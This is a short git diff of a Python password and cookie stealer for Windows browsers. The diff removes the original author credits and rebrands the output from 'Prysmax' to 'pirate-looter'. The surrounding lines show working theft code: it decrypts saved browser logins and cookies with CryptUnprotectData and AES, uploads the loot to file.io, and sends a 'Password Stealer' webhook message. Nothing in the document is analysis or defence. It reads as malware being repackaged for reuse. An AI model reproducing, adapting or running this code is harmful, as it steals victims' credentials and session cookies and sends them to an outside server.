@@ -1,12 +1,3 @@
-# #  # # # # # # # # # # # # # # # # # # #
-#        GITHUB.COM/Lawxsz               #
-#                                        #
-#    Credits or at least one star :)     #
-#   SCRIPT BY henry-richard7             #
-#   improved and adapted by Lawxsz       #
-# #  # # # # # # # # # # # # # # # # # # #
-
-
 import os, requests, json, base64, sqlite3, shutil
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
@@ -87,11 +78,11 @@ def get_login_data(path: str, profile: str, master_key):
     for row in cursor.fetchall():
         password = decrypt_password(row[2], master_key)
         result += f"""
-        -- Prysmax Premium --
+        -- pirate-looter Premium --
         URL: {row[0]}
         Email: {row[1]}
         Password: {password}
-        -- Prysmax Premium --
+        -- pirate-looter Premium --
         """
     conn.close()
     os.remove(user+'\\AppData\\Local\\Temp\\login_db')
@@ -143,14 +134,14 @@ def get_cookies(path: str, profile: str, master_key):
         cookie = decrypt_password(row[3], master_key)
 
         result += f"""
-        -- Prysmax Premium --
+        -- pirate-looter Premium --
 
         Host Key : {row[0]}
         Cookie Name : {row[1]}
         Path: {row[2]}
         Cookie: {cookie}
         Expires On: {row[4]}
-        -- Prysmax Premium --
+        -- pirate-looter Premium --
 
         """
 
@@ -238,7 +229,7 @@ def mainpass():
     response = requests.post("https://file.io", files=files, params=params).json()
     todo = {
     "avatar_url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif",
-    "username": "Prysmax Free",
+    "username": "pirate-looter Free",
     "embeds": [
         {
             "title": "Password Stealer",
